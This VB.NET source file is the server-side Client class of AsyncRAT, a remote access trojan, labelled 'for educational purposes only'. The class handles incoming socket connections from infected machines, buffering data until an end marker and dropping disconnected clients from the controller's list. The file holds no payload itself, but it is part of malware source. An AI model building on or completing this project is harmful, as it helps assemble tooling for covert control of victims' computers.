Imports System.IO
Imports System.Net.Sockets

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class Client

    Public IsConnected As Boolean = True
    Public L As ListViewItem = Nothing
    Public C As Socket = Nothing
    Public IP As String = Nothing
    Public Buffer(1024 * 100) As Byte
    Public MS As MemoryStream = Nothing
    Public Shared Event Read(ByVal C As Client, ByVal b() As Byte)

    Sub New(ByVal CL As Socket)
        Me.C = CL

        Me.Buffer = New Byte(1024 * 100) {}
        Me.MS = New MemoryStream
        Me.IP = CL.RemoteEndPoint.ToString

        C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
    End Sub

    Async Sub BeginReceive(ByVal ar As IAsyncResult)
        Await Task.Delay(1)
        If IsConnected = False Then isDisconnected()

        Try
            Dim Received As Integer = C.EndReceive(ar)
            If Received > 0 Then
                Await MS.WriteAsync(Buffer, 0, Received)

                If BS(MS.ToArray).Contains(Settings.EOF) Then
                    RaiseEvent Read(Me, MS.ToArray)
                    Await MS.FlushAsync
                    MS.Dispose()
                    MS = New MemoryStream
                End If

            End If
            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Delegate Sub _isDisconnected()
    Sub isDisconnected()

        IsConnected = False

        Try
            If Messages.F.InvokeRequired Then
                Messages.F.Invoke(New _isDisconnected(AddressOf isDisconnected))
                Exit Sub
            Else
                L.Remove()
            End If
        Catch ex As Exception
        End Try

        Try
            C.Close()
            C.Dispose()
        Catch ex As Exception
        End Try

        Try
            MS.Dispose()
        Catch ex As Exception
        End Try

        Try
            Buffer = Nothing
        Catch ex As Exception
        End Try

    End Sub

    Sub EndSend(ByVal ar As IAsyncResult)
        Try
            C.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

End Class
